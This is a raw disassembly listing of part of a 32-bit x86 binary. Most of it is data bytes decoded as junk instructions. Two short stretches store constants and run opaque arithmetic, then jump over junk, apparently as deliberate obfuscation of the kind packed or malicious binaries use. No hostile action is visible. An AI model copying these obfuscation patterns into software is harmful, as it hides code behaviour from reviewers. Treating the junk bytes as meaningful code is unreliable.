  41f3da:	rcr    DWORD PTR [edi],cl
  41f3dc:	into   
  41f3dd:	inc    edx
  41f3de:	fisub  DWORD PTR [ebx+ebp*8]
  41f3e1:	sbb    al,0x90
  41f3e3:	mov    ch,0x2f
  41f3e5:	xchg   BYTE PTR [ebx+0x12c9f18f],al
  41f3eb:	cs push ebp
  41f3ed:	mov    cl,0x2e
  41f3ef:	cmp    DWORD PTR [ecx+0x2de8f578],ebx
  41f3f5:	ins    DWORD PTR es:[edi],dx
  41f3f6:	or     BYTE PTR [ecx+0x60],ah
  41f3f9:	inc    edx
  41f3fa:	sbb    eax,0xe2a9de5e
  41f3ff:	aad    0x42
  41f401:	inc    esi
  41f402:	jle    0x41f431
  41f404:	popa   
  41f405:	mov    bl,0x10
  41f407:	retf   
  41f408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f409:	sub    dh,dl
  41f40b:	lds    eax,FWORD PTR [ebx+0x53855f5d]
  41f411:	adc    eax,0xfdc1471a
  41f416:	mov    DWORD PTR ds:0x810ba73d,ecx
  41f41c:	pop    ss
  41f41d:	jb     0x41f3eb
  41f41f:	lock aam 0x4e
  41f422:	(bad)  
  41f423:	inc    esi
  41f424:	dec    edi
  41f425:	call   0x3b25:0xda6a22b0
  41f42c:	pop    edi
  41f42d:	sbb    DWORD PTR [ecx-0x2a],esp
  41f430:	inc    ebp
  41f431:	pop    eax
  41f432:	int    0xe1
  41f434:	cmp    eax,0x4acf37ec
  41f439:	or     DWORD PTR [edi-0x3c6d50e5],esp
  41f43f:	inc    eax
  41f440:	cmp    bh,BYTE PTR [edi-0x5cebc52a]
  41f446:	popa   
  41f447:	inc    ebp
  41f448:	je     0x41f44a
  41f44a:	and    DWORD PTR [esi+ecx*4-0x28],eax
  41f44e:	dec    ecx
  41f44f:	sahf   
  41f450:	xchg   edx,eax
  41f451:	adc    DWORD PTR [eax+esi*1+0x77294696],edi
  41f458:	repz jmp 0x41f446
  41f45b:	sti    
  41f45c:	(bad)  
  41f45d:	call   0xc834aa7d
  41f462:	mov    cl,0x20
  41f464:	inc    edi
  41f465:	int    0xba
  41f467:	push   ds
  41f468:	xchg   BYTE PTR es:[eax],dl
  41f46b:	inc    ebp
  41f46c:	fmul   QWORD PTR [ebx]
  41f46e:	mov    al,0xa
  41f470:	ds jae 0x41f4cc
  41f473:	lea    esi,[edx+0x19ec6c73]
  41f479:	aas    
  41f47a:	add    DWORD PTR [esi+eiz*1],0xffffffe9
  41f47e:	sub    BYTE PTR [edi],bl
  41f480:	and    ch,bl
  41f482:	jbe    0x41f4c1
  41f484:	ret    
  41f485:	mov    dh,0xab
  41f487:	outs   dx,DWORD PTR ds:[esi]
  41f488:	imul   ecx,DWORD PTR [esi+edi*1],0x57491ca8
  41f48f:	sub    al,0xd3
  41f491:	nop
  41f492:	dec    ebp
  41f493:	add    esi,DWORD PTR [ecx]
  41f495:	stos   DWORD PTR es:[edi],eax
  41f496:	jne    0x41f458
  41f498:	pusha  
  41f499:	mov    cl,0x53
  41f49b:	neg    DWORD PTR [edi-0x60d38a51]
  41f4a1:	cmp    BYTE PTR [ebp-0x5d],dl
  41f4a4:	cld    
  41f4a5:	sub    eax,0x59fbea07
  41f4aa:	mov    ds:0xffb6b5cf,al
  41f4af:	mov    ds:0x4e26c8fa,al
  41f4b4:	sar    ch,1
  41f4b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4b7:	mov    ebp,0xd3748503
  41f4bc:	xor    BYTE PTR [esi+0x4d92e41a],ch
  41f4c2:	mov    ds:0xf1cbedd4,al
  41f4c7:	mov    eax,ds:0x831ae7c2
  41f4cc:	mov    al,0x49
  41f4ce:	mov    bl,0xe0
  41f4d0:	mov    ebx,DWORD PTR [esi-0x2f]
  41f4d3:	aas    
  41f4d4:	jg     0x41f51b
  41f4d6:	aam    0x98
  41f4d8:	xor    BYTE PTR [edi],0xb5
  41f4db:	adc    esi,DWORD PTR [edx-0x5f]
  41f4de:	cmp    eax,0xd14ced9
  41f4e3:	mov    ds:0x4834c929,eax
  41f4e8:	jns    0x41f4b2
  41f4ea:	mov    bh,0xd0
  41f4ec:	and    dl,ah
  41f4ee:	sbb    DWORD PTR [ecx],0x2a295091
  41f4f4:	cmp    DWORD PTR [ecx+0xd],eax
  41f4f7:	div    DWORD PTR [eax+0x707fa617]
  41f4fd:	sar    DWORD PTR [ecx],0x79
  41f500:	stos   BYTE PTR es:[edi],al
  41f501:	inc    ebp
  41f502:	ret    0xfbf4
  41f505:	sub    ebp,DWORD PTR [eax+eiz*8]
  41f508:	shl    BYTE PTR [eax-0x5fda8629],cl
  41f50e:	lahf   
  41f50f:	and    DWORD PTR [ebp-0x2f],ebp
  41f512:	adc    bh,BYTE PTR [edx]
  41f514:	pushf  
  41f515:	inc    ebp
  41f516:	add    edx,DWORD PTR [edi+edx*4+0x16267ea0]
  41f51d:	int3   
  41f51e:	pushf  
  41f51f:	pop    edi
  41f520:	ror    cl,1
  41f522:	test   eax,0xec819a0f
  41f527:	loop   0x41f4e0
  41f529:	push   esi
  41f52a:	mov    ch,0xc2
  41f52c:	and    BYTE PTR [eax+0x7d],al
  41f52f:	cdq    
  41f530:	pop    edx
  41f531:	cmp    DWORD PTR [ecx],ebx
  41f533:	mov    esi,0xa8e922c9
  41f538:	mov    ds:0x6f75b4af,eax
  41f53d:	mov    ds:0x46b2771f,al
  41f542:	add    dl,BYTE PTR [edx-0x1c]
  41f545:	sar    dh,1
  41f547:	jo     0x41f55a
  41f549:	bound  ebp,QWORD PTR [eax]
  41f54b:	fwait
  41f54c:	and    al,0x43
  41f54e:	icebp  
  41f54f:	mov    WORD PTR [edx+0x6fb970bb],?
  41f555:	jge    0x41f541
  41f557:	sub    DWORD PTR [edx-0x7f],edi
  41f55a:	add    dl,bh
  41f55c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f55d:	xor    DWORD PTR [ebx],0xdccd0e07
  41f563:	push   es
  41f564:	aas    
  41f565:	int    0x71
  41f567:	loopne 0x41f5be
  41f569:	addr16 jno 0x41f545
  41f56c:	push   ds
  41f56d:	jle    0x41f581
  41f56f:	lahf   
  41f570:	dec    ebp
  41f571:	dec    ebp
  41f572:	(bad)  
  41f573:	xchg   edx,eax
  41f574:	popa   
  41f575:	(bad)  
  41f576:	pop    ebp
  41f577:	fnstsw WORD PTR [edi+edi*4]
  41f57a:	icebp  
  41f57b:	inc    ebp
  41f57c:	lods   al,BYTE PTR ds:[esi]
  41f57d:	or     edx,DWORD PTR [edi+ebp*1+0x6dec4eb5]
  41f584:	cwde   
  41f585:	push   esi
  41f586:	hlt    
  41f587:	mov    dh,ah
  41f589:	stos   DWORD PTR es:[edi],eax
  41f58a:	push   ds
  41f58b:	mov    ds:0x3775678e,al
  41f590:	test   eax,ecx
  41f592:	mov    bl,0xc6
  41f594:	mov    ecx,DWORD PTR [ebp-0xdc]
  41f59a:	and    eax,ecx
  41f59c:	add    eax,DWORD PTR [ebp-0x44]
  41f59f:	mov    ecx,DWORD PTR [ebp-0xe0]
  41f5a5:	lea    eax,[eax+ecx*1+0x272f]
  41f5ac:	xor    eax,0x1080c
  41f5b1:	add    eax,DWORD PTR [ebp-0x178]
  41f5b7:	mov    DWORD PTR [ebp-0xe8],eax
  41f5bd:	mov    DWORD PTR [ebp-0xc],0x5950
  41f5c4:	mov    DWORD PTR [ebp-0xf8],0x4964
  41f5ce:	mov    DWORD PTR [ebp-0x130],0x3
  41f5d8:	mov    DWORD PTR [ebp-0x20],0x2df9
  41f5df:	mov    DWORD PTR [ebp-0x8],0x4524
  41f5e6:	mov    DWORD PTR [ebp-0xd4],0x637e
  41f5f0:	mov    DWORD PTR [ebp-0x110],0x38c8
  41f5fa:	mov    DWORD PTR [ebp-0xa4],0x7118
  41f604:	mov    DWORD PTR [ebp-0xa0],0xaf6
  41f60e:	mov    DWORD PTR [ebp-0x10c],0x3315
  41f618:	mov    eax,DWORD PTR [ebp-0xf8]
  41f61e:	mov    ecx,DWORD PTR [ebp-0x130]
  41f624:	xor    edx,edx
  41f626:	div    ecx
  41f628:	add    eax,0x454e
  41f62d:	mov    ecx,DWORD PTR [ebp-0xc]
  41f630:	and    eax,ecx
  41f632:	xor    eax,0x5940
  41f637:	add    eax,DWORD PTR [ebp+0x8]
  41f63a:	mov    ecx,DWORD PTR [ebp-0x110]
  41f640:	mov    edx,DWORD PTR [ebp-0xa4]
  41f646:	sub    ecx,edx
  41f648:	mov    edx,DWORD PTR [ebp-0xd4]
  41f64e:	or     ecx,edx
  41f650:	mov    edx,DWORD PTR [ebp-0x8]
  41f653:	and    ecx,edx
  41f655:	jmp    0x41fa3c
  41f65a:	cmp    DWORD PTR [ebx-0x6397a419],esi
  41f660:	mov    edx,0x50f9fab3
  41f665:	sahf   
  41f666:	jp     0x41f66d
  41f668:	cld    
  41f669:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f66a:	dec    esp
  41f66b:	test   eax,eax
  41f66d:	mov    esi,0xbebec44a
  41f672:	push   0xde93b1d6
  41f677:	sbb    ebx,ebx
  41f679:	shr    DWORD PTR [eax],1
  41f67b:	in     al,0x3
  41f67d:	add    al,BYTE PTR [esp+ebx*1-0x1f]
  41f681:	pushf  
  41f682:	out    0x5e,al
  41f684:	add    BYTE PTR [esi-0x7313bde8],0xa7
  41f68b:	cs out 0x8e,eax
  41f68e:	shl    DWORD PTR [eax+0x55],cl
  41f691:	inc    edx
  41f692:	aad    0xe1
  41f694:	call   0x299b4e3b
  41f699:	(bad)
  41f69c:	jns    0x41f701
  41f69e:	shr    BYTE PTR [esi+0x23],1
  41f6a1:	repz bound eax,QWORD PTR [edi-0x608c979]
  41f6a8:	mov    ebx,0x7a7fa257
  41f6ad:	popf   
  41f6ae:	loope  0x41f67b
  41f6b0:	pop    esi
  41f6b1:	retf   
  41f6b2:	and    edx,0x7a69dd7c
  41f6b8:	or     al,ch
  41f6ba:	dec    edi
  41f6bb:	push   ebx
  41f6bc:	loop   0x41f67d
  41f6be:	or     al,BYTE PTR [esi]
  41f6c0:	lea    ebx,[esi-0x34]
  41f6c3:	cmp    cl,dl
  41f6c5:	xchg   esi,eax
  41f6c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6c7:	fnstsw WORD PTR [edi+0x75]
  41f6ca:	sbb    DWORD PTR [edi+0x2b98e373],edi
  41f6d0:	bound  ebx,QWORD PTR [edi]
  41f6d2:	add    eax,0xdf7788e0
  41f6d7:	add    BYTE PTR [edx-0x7bad7df5],ch
  41f6dd:	je     0x41f6a8
  41f6df:	add    al,0x7b
  41f6e1:	(bad)  
  41f6e2:	xchg   edi,eax
  41f6e3:	popf   
  41f6e4:	mov    edi,0x91cffd93
  41f6e9:	popa   
  41f6ea:	stos   BYTE PTR es:[edi],al
  41f6eb:	and    al,0xb2
  41f6ed:	inc    edx
  41f6ee:	mov    ds:0x73793a4f,eax
  41f6f3:	jns    0x41f72b
  41f6f5:	xchg   DWORD PTR [ecx],eax
  41f6f7:	jb     0x41f6b0
  41f6f9:	mov    WORD PTR [ecx+0x46607e5c],cs
  41f6ff:	cmc    
  41f700:	jl     0x41f6e4
  41f702:	xchg   edx,eax
  41f703:	mov    ah,0x7d
  41f705:	test   eax,0xa202124d
  41f70a:	ja     0x41f6a0
  41f70c:	mov    ch,0x86
  41f70e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f70f:	push   0xd73dcf8d
  41f714:	stos   DWORD PTR es:[edi],eax
  41f715:	(bad)  
  41f716:	(bad)  
  41f717:	aaa    
  41f718:	or     cl,BYTE PTR [esi+0x30664bf7]
  41f71e:	push   cs
  41f71f:	idiv   BYTE PTR [ebx]
  41f721:	call   0x7087a55a
  41f726:	int    0xce
  41f728:	push   0x386996c6
  41f72d:	mov    ch,0xd9
  41f72f:	jecxz  0x41f6f2
  41f731:	mov    eax,ds:0xd4a8cf9d
  41f736:	retf   0x5ac7
  41f739:	std    
  41f73a:	push   eax
  41f73b:	mov    eax,ds:0xd7b38aa7
  41f740:	and    BYTE PTR [esi-0x38a500c5],ah
  41f746:	test   BYTE PTR [ebp+0xf4135d9],dh
  41f74c:	out    dx,eax
  41f74d:	sahf   
  41f74e:	add    DWORD PTR [ecx],ebp
  41f750:	add    ebp,ebp
  41f752:	xchg   edx,eax
  41f753:	es in  al,dx
  41f755:	into   
  41f756:	(bad)  
  41f759:	es hlt 
  41f75b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f75c:	mov    eax,ds:0xa997e0bc
  41f761:	mov    BYTE PTR [ecx],bl
  41f763:	lock scas al,BYTE PTR es:[edi]
  41f765:	sar    BYTE PTR cs:[ecx+0x2d],0x46
  41f76a:	iret   
  41f76b:	inc    ebx
  41f76c:	xor    BYTE PTR [ebp+0x60688b20],ah
  41f772:	lahf   
  41f773:	dec    eax
  41f774:	sti    
  41f775:	xchg   ecx,eax
  41f776:	ret    0xc928
  41f779:	(bad)  
  41f77b:	adc    BYTE PTR [edi+0x2709cb13],bl
  41f781:	or     DWORD PTR [ebx],edi
  41f783:	mov    dl,0xf4
  41f785:	push   edi
  41f786:	in     al,dx
  41f787:	sbb    eax,0xcdadd120
  41f78c:	mov    BYTE PTR [esi+0x3e],bh
  41f78f:	inc    ecx
  41f790:	loope  0x41f756
  41f792:	jle    0x41f718
  41f794:	call   0xbbe5848f
  41f799:	loopne 0x41f7c4
  41f79b:	cwde   
  41f79c:	push   ss
  41f79d:	cmp    BYTE PTR [edx],al
  41f79f:	ins    BYTE PTR es:[edi],dx
  41f7a0:	lock mov ebx,0x1703e22c
  41f7a6:	arpl   WORD PTR [edx],sp
  41f7a8:	mov    esi,0xc82d65c5
  41f7ad:	aas    
  41f7ae:	add    al,0x14
  41f7b0:	hlt    
  41f7b1:	out    0x93,eax
  41f7b3:	mov    DWORD PTR [esp+eiz*4],esi
  41f7b6:	push   eax
  41f7b7:	mov    eax,0xa5c06637
  41f7bc:	push   edi
  41f7bd:	push   sp
  41f7bf:	push   ebx
  41f7c0:	push   0x6d
  41f7c2:	inc    ebx
  41f7c3:	icebp  
  41f7c4:	jnp    0x41f77c
  41f7c6:	mov    edx,esp
  41f7c8:	lahf   
  41f7c9:	fwait
  41f7ca:	out    dx,eax
  41f7cb:	and    al,0x23
  41f7cd:	cmp    BYTE PTR [edi-0x2b],0x87
  41f7d1:	pushf  
  41f7d2:	rcr    ecx,0x99
  41f7d5:	loope  0x41f761
  41f7d7:	inc    esi
  41f7d8:	imul   ebp,esp,0x62dae8cf
  41f7de:	out    dx,eax
  41f7df:	aam    0xbe
  41f7e1:	out    0x3e,eax
  41f7e3:	xchg   ebp,eax
  41f7e4:	dec    edx
  41f7e5:	pop    edi
  41f7e6:	lahf   
  41f7e7:	imul   ebp,ebp,0x37972918
  41f7ed:	adc    edx,DWORD PTR [edi-0x5c]
  41f7f0:	sbb    DWORD PTR [esi+0x78],esp
  41f7f3:	jb     0x41f830
  41f7f5:	add    ebp,DWORD PTR [edx-0x14d458a3]
  41f7fb:	invd   
  41f7fd:	inc    esi
  41f7fe:	jb     0x41f818
  41f800:	xor    DWORD PTR [edi+0x68a77b41],ebp
  41f806:	jns    0x41f79d
  41f808:	and    DWORD PTR [eax-0x6f8f3a2d],edx
  41f80e:	das    
  41f80f:	xor    ah,BYTE PTR [edi+0x77]
  41f812:	xchg   ebx,eax
  41f813:	sbb    ch,BYTE PTR [edx-0x4cd1ae1b]
  41f819:	int3   
  41f81a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f81b:	cmc    
  41f81c:	cmp    al,0xe3
  41f81f:	mov    dl,BYTE PTR [ebx+edi*2]
  41f822:	xlat   BYTE PTR ds:[ebx]
  41f823:	xor    eax,0x737e52b1
  41f828:	cmp    DWORD PTR [ebx+0x23d1a6ab],ebp
  41f82e:	push   esi
  41f82f:	pop    ds
  41f830:	mov    dl,0x17
  41f832:	adc    bl,ch
  41f834:	sbb    DWORD PTR [ebx-0x65],ecx
  41f837:	mov    DWORD PTR [ebp-0x34],ebx
  41f83a:	add    eax,0xec93f95c
  41f83f:	rcl    DWORD PTR [ebx],0xf4
  41f842:	xor    bl,ch
  41f844:	dec    ecx
  41f845:	popf   
  41f846:	stos   BYTE PTR es:[edi],al
  41f847:	pop    edi
  41f848:	or     eax,0x5825b2ef
  41f84d:	push   ss
  41f84e:	repz data16 and al,0xd3
  41f852:	in     al,0xba
  41f854:	sub    eax,0x3ae5a09f
  41f859:	aaa    
  41f85a:	shl    dh,0x0
  41f85d:	mov    edi,0xad77eb6e
  41f862:	sub    DWORD PTR [ebx+0x35e4b0ab],0xffffff92
  41f869:	sbb    esi,eax
  41f86b:	loope  0x41f8ca
  41f86d:	lods   eax,DWORD PTR ds:[esi]
  41f86e:	outs   dx,DWORD PTR ds:[esi]
  41f86f:	out    dx,eax
  41f870:	dec    ebx
  41f871:	inc    ecx
  41f872:	fwait
  41f873:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f874:	cmp    al,0x8
  41f876:	(bad)  
  41f877:	int    0x6c
  41f879:	pop    dx
  41f87b:	jno    0x41f87c
  41f87d:	ins    BYTE PTR es:[edi],dx
  41f87e:	fcom   QWORD PTR [edx+0x6762ba62]
  41f884:	pusha  
  41f885:	fucomp st(4)
  41f887:	add    ecx,DWORD PTR [edx+0x2c]
  41f88a:	push   0x1a
  41f88c:	jmp    0x41f88e
  41f88e:	and    al,0x2
  41f890:	fisubr WORD PTR [ebx]
  41f892:	retf   
  41f893:	mov    al,0xd0
  41f895:	xchg   edi,eax
  41f896:	add    BYTE PTR [edx],dl
  41f898:	xor    eax,eax
  41f89a:	mov    esp,0x8391ca85
  41f89f:	push   0xffffffb3
  41f8a1:	popf   
  41f8a2:	aam    0x54
  41f8a4:	in     eax,dx
  41f8a5:	xor    al,0x6b
  41f8a7:	pop    edx
  41f8a8:	add    al,0x53
  41f8aa:	mov    gs,WORD PTR [eax]
  41f8ac:	xchg   esp,eax
  41f8ad:	pop    esi
  41f8ae:	xchg   BYTE PTR [esi+ebx*2+0x69],al
  41f8b2:	xor    DWORD PTR [ecx-0x2bd0cb01],ebx
  41f8b8:	rcl    DWORD PTR [ebp+0x32],1
  41f8bb:	cmp    cl,BYTE PTR ds:0x2a6413e5
  41f8c1:	jg     0x41f84c
  41f8c3:	or     eax,0xd86250eb
  41f8c8:	out    dx,eax
  41f8c9:	sbb    ch,ch
  41f8cb:	clc    
  41f8cc:	aas    
  41f8cd:	loop   0x41f8b4
  41f8cf:	fldcw  WORD PTR [edx]
  41f8d1:	or     DWORD PTR [esi-0x43e381ac],ebx
  41f8d7:	jo     0x41f8c7
  41f8d9:	test   al,0xeb
  41f8db:	rol    cl,cl
  41f8dd:	sub    edx,DWORD PTR [esi-0x1a]
  41f8e0:	or     esi,DWORD PTR [ecx]
  41f8e2:	iret   
  41f8e3:	in     eax,0xff
  41f8e5:	xchg   DWORD PTR [ecx+ebx*1+0x693ff029],ecx
  41f8ec:	frstor [eax-0x4d]
  41f8ef:	sub    ecx,DWORD PTR [edx-0x6e66a579]
  41f8f5:	pop    edi
  41f8f6:	mov    fs,WORD PTR [esi]
  41f8f8:	mov    dh,0xbc
  41f8fa:	or     BYTE PTR [edx],0x68
  41f8fd:	lods   eax,DWORD PTR ds:[esi]
  41f8fe:	sbb    cl,BYTE PTR [ebp+0x2b]
  41f901:	icebp  
  41f902:	cmc    
  41f903:	aaa    
  41f904:	mov    bh,0xeb
  41f906:	out    dx,al
  41f907:	and    eax,DWORD PTR [eax-0x2d17017a]
  41f90d:	push   ss
  41f90e:	ror    DWORD PTR [edx+0x4a],cl
  41f911:	pop    edi
  41f912:	sbb    bl,BYTE PTR [ecx]
  41f914:	jl     0x41f907
  41f916:	mov    es,WORD PTR [di]
  41f919:	jbe    0x41f998
  41f91b:	std    
  41f91c:	dec    ebx
  41f91d:	mov    edi,DWORD PTR [edx+0x74]
  41f920:	jnp    0x41f93c
  41f922:	add    ebx,DWORD PTR [ecx+0x606912e6]
  41f928:	cli    
  41f929:	xchg   esp,eax
  41f92a:	pop    ebp
  41f92b:	and    eax,0x5d571cfd
  41f930:	out    0x28,eax
  41f932:	pop    es
  41f933:	add    al,BYTE PTR [ebp-0x65]
  41f936:	xchg   esi,eax
  41f937:	pop    edx
  41f938:	ds pop edi
  41f93a:	xchg   edi,eax
  41f93b:	mov    cl,BYTE PTR [ebx]
  41f93d:	jne    0x41f9a2
  41f93f:	jmp    0x41f964
  41f941:	or     BYTE PTR [edi+0x8],ah
  41f944:	fisttp DWORD PTR [eax+0xc]
  41f947:	fadd   DWORD PTR [ecx+0x6f]
  41f94a:	jg     0x41f953
  41f94c:	or     eax,0x9e98f75f
  41f951:	xchg   ebp,eax
  41f952:	fmul   QWORD PTR [edx+0x62]
  41f955:	scas   eax,DWORD PTR es:[edi]
  41f956:	mov    ds:0x52472968,al
  41f95b:	aaa    
  41f95c:	into   
  41f95d:	inc    ebx
  41f95e:	jbe    0x41f9dd
  41f960:	mov    esi,0x4c160379
  41f965:	and    eax,0x489720a1
  41f96a:	pop    edx
  41f96b:	outs   dx,DWORD PTR ds:[esi]
  41f96c:	test   BYTE PTR [ecx+0x2bfb5674],0xf5
  41f973:	(bad)  
  41f974:	stc    
  41f975:	loop   0x41f994
  41f977:	scas   al,BYTE PTR es:[edi]
  41f978:	jg     0x41f930
  41f97a:	stos   DWORD PTR es:[edi],eax
  41f97b:	xlat   BYTE PTR ds:[ebx]
  41f97c:	fnstenv [edx-0x7b41150b]
  41f982:	xor    esi,esi
  41f984:	adc    dl,dh
  41f986:	add    al,0x22
  41f988:	lds    edx,FWORD PTR [ecx-0x72]
  41f98b:	das    
  41f98c:	mov    cl,0x4e
  41f98e:	out    0x88,eax
  41f990:	or     eax,0x5efa7bfd
  41f995:	sbb    ch,BYTE PTR [ecx+0x27]
  41f998:	popa   
  41f999:	jns    0xef2d6cfe
  41f99f:	lea    eax,ds:[ecx]
  41f9a2:	mov    ch,0xcf
  41f9a4:	cwde   
  41f9a5:	sub    eax,0xb81addfa
  41f9aa:	inc    eax
  41f9ab:	or     esi,DWORD PTR [eax]
  41f9ad:	out    dx,al
  41f9ae:	mov    esp,0x6302d500
  41f9b3:	or     bl,BYTE PTR [eax-0x5712a332]
  41f9b9:	repz (bad)
  41f9bc:	mov    edx,0xabb7d52f
  41f9c1:	outs   dx,DWORD PTR ds:[esi]
  41f9c2:	fstp   DWORD PTR [esi-0x4f54bf68]
  41f9c8:	add    DWORD PTR [eax-0x25],esi
  41f9cb:	pop    ds
  41f9cc:	inc    edi
  41f9cd:	mov    ch,0x30
  41f9cf:	pop    edi
  41f9d0:	xchg   edi,eax
  41f9d1:	jg     0x41f9c1
  41f9d3:	call   DWORD PTR [ebp-0x81ee5ca]
  41f9d9:	dec    eax
  41f9da:	or     eax,0x494cdd0f
  41f9df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9e0:	js     0x41fa35
  41f9e2:	adc    al,0x8d
  41f9e4:	sub    al,0xe8
  41f9e6:	ds mov edi,eax
  41f9e9:	or     BYTE PTR [ebp+ebx*8+0x5c],dl
  41f9ed:	add    eax,0xaec59cb4
  41f9f2:	sbb    BYTE PTR [ecx+0x59d4f103],dh
  41f9f8:	push   DWORD PTR [ebp+0x68]
  41f9fb:	sbb    BYTE PTR [edx+0x3758e98f],cl
  41fa01:	in     eax,dx
  41fa02:	scas   al,BYTE PTR es:[edi]
  41fa03:	popf   
  41fa04:	and    al,cl
  41fa06:	aam    0x7f
  41fa08:	or     eax,DWORD PTR ds:0x755a3d0f
  41fa0e:	psrlw  mm2,QWORD PTR [eax+eiz*4+0x4e]
  41fa13:	jmp    0x93f5ecfe
  41fa18:	adc    ch,BYTE PTR [eax+0x57]
  41fa1b:	sti    
  41fa1c:	xchg   BYTE PTR [edx],dl
  41fa1e:	in     al,0x9
  41fa20:	scas   eax,DWORD PTR es:[edi]
  41fa21:	and    al,0xa6
  41fa23:	xor    cl,BYTE PTR [edx]
  41fa25:	mov    ebp,0xf0749cde
  41fa2a:	mov    DWORD PTR [edi-0x50],ebp
  41fa2d:	dec    ecx
  41fa2e:	or     al,0x4e
  41fa30:	mul    edi
  41fa32:	add    DWORD PTR [eax],edx
  41fa34:	(bad)  
  41fa35:	retf   
  41fa36:	jb     0x41fa5d
  41fa38:	or     eax,0x8bc4bc5f
  41fa3d:	push   ebp
  41fa3e:	loopne 0x41fa73
  41fa40:	retf   0x958b
  41fa43:	hlt    
  41fa44:	(bad)  
  41fa45:	(bad)  
  41fa46:	(bad)  
  41fa47:	mov    esi,0x180f
  41fa4c:	sub    esi,edx
  41fa4e:	mov    edx,DWORD PTR [ebp-0xa0]
  41fa54:	imul   esi,edx
  41fa57:	xor    esi,0x402b
  41fa5d:	xor    esi,0xfed78c17
  41fa63:	mov    edx,DWORD PTR [ebp-0xe8]
  41fa69:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  41fa70:	add    ecx,eax
  41fa72:	add    esi,ecx
  41fa74:	mov    DWORD PTR [ebp-0x38],esi
  41fa77:	mov    DWORD PTR [ebp-0x4],0x59a8
  41fa7e:	mov    DWORD PTR [ebp-0x30],0x7021
  41fa85:	mov    DWORD PTR [ebp-0xf4],0x6210
  41fa8f:	mov    DWORD PTR [ebp-0x58],0x73d5
  41fa96:	mov    DWORD PTR [ebp-0x124],0x1e7d
  41faa0:	mov    DWORD PTR [ebp-0x3c],0x3144
  41faa7:	mov    eax,DWORD PTR [ebp-0x30]
  41faaa:	xor    eax,0x75cb
  41faaf:	mov    ecx,DWORD PTR [ebp-0x4]
  41fab2:	imul   eax,ecx
  41fab5:	mov    ecx,DWORD PTR [ebp+0x8]
  41fab8:	lea    ecx,[ecx+eax*1-0x2123b90]
  41fabf:	mov    eax,DWORD PTR [ebp-0xf4]
  41fac5:	and    eax,0x6b34
  41faca:	and    eax,0x658d
  41facf:	xor    edx,edx
  41fad1:	push   0x6
  41fad3:	pop    esi
  41fad4:	div    esi
  41fad6:	imul   eax,eax,0x3fb9
  41fadc:	mov    edx,DWORD PTR [ebp-0x3c]
  41fadf:	and    edx,0x58c7
  41fae5:	mov    esi,DWORD PTR [ebp-0x124]
  41faeb:	or     edx,esi
  41faed:	add    edx,0x7a25
  41faf3:	imul   edx,edx,0x28d2
  41faf9:	mov    esi,DWORD PTR [ebp-0x58]
  41fafc:	xor    edx,esi
  41fafe:	xor    edx,0x1856f731
  41fb04:	mov    esi,DWORD PTR [ebp-0xe8]
  41fb0a:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  41fb11:	add    eax,ecx
  41fb13:	add    edx,eax
  41fb15:	mov    DWORD PTR [ebp-0xac],edx
  41fb1b:	mov    DWORD PTR [ebp-0x54],0x1
  41fb22:	mov    DWORD PTR [ebp-0x40],0x1ee8
  41fb29:	mov    DWORD PTR [ebp-0x1c],0x64d8
  41fb30:	mov    DWORD PTR [ebp-0xf0],0x5a06
  41fb3a:	mov    DWORD PTR [ebp-0x108],0x2eeb
  41fb44:	mov    DWORD PTR [ebp-0x104],0x2108
  41fb4e:	mov    eax,DWORD PTR [ebp-0x1c]
  41fb51:	jmp    0x41ff38
  41fb56:	cwde   
  41fb57:	push   ebx
  41fb58:	popa   
  41fb59:	pop    edx
  41fb5a:	stos   BYTE PTR es:[edi],al
  41fb5b:	jl     0x41fb15
  41fb5d:	xchg   ebx,eax
  41fb5e:	mov    dl,0x3a
  41fb60:	repnz iret 
  41fb62:	sbb    eax,0xd7cfb020
  41fb67:	(bad)  
  41fb68:	sar    BYTE PTR [esi-0x41413bb6],0x95
  41fb6f:	jae    0x41fbef
  41fb71:	shr    DWORD PTR [edi],0xb7
  41fb74:	mov    eax,ds:0x25a5e3d7
  41fb79:	into   
  41fb7a:	jmp    FWORD PTR [edx-0x67]
  41fb7d:	mov    DWORD PTR [ebx-0x7a],ecx
  41fb80:	mov    gs,esi
  41fb82:	int    0x41
  41fb84:	sub    eax,esi
  41fb86:	out    dx,al
  41fb87:	jo     0x41fb1e
  41fb89:	jl     0x41fc02
  41fb8b:	xlat   BYTE PTR ds:[ebx]
  41fb8c:	xor    BYTE PTR [edx-0x51d7da52],al
  41fb92:	and    DWORD PTR [ecx],esi
  41fb94:	jle    0x41fbed
  41fb96:	ret    
  41fb97:	pop    esi
  41fb98:	stos   BYTE PTR es:[edi],al
  41fb99:	xchg   ebx,eax
  41fb9a:	mov    ah,0xf5
  41fb9c:	pop    es
  41fb9d:	fwait
  41fb9e:	cmp    al,0x61
  41fba0:	repnz daa 
  41fba2:	lods   al,BYTE PTR ds:[esi]
  41fba3:	leave  
  41fba4:	imul   ebp,DWORD PTR [edi-0x58],0x53
  41fba8:	cmp    eax,0xa9d21535
  41fbad:	cdq    
  41fbae:	scas   eax,DWORD PTR es:[edi]
  41fbaf:	mov    WORD PTR [eax-0x66],cs
  41fbb2:	not    DWORD PTR [edi+0x4f]
  41fbb5:	shl    BYTE PTR [esi-0x54ff8d12],0xdd
  41fbbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbbd:	enter  0x5c7,0x98
  41fbc1:	ins    DWORD PTR es:[edi],dx
  41fbc2:	push   es
  41fbc3:	sub    DWORD PTR [ecx-0x1a],esp
  41fbc6:	cmp    ecx,DWORD PTR [edx-0x22]
  41fbc9:	xor    eax,0x2edaea02
  41fbce:	xor    eax,0x1444ff34
  41fbd3:	push   ebx
  41fbd4:	pop    ecx
  41fbd5:	xchg   esi,eax
  41fbd6:	ror    DWORD PTR [edi+0x498d0d03],1
  41fbdc:	enter  0x507c,0x94
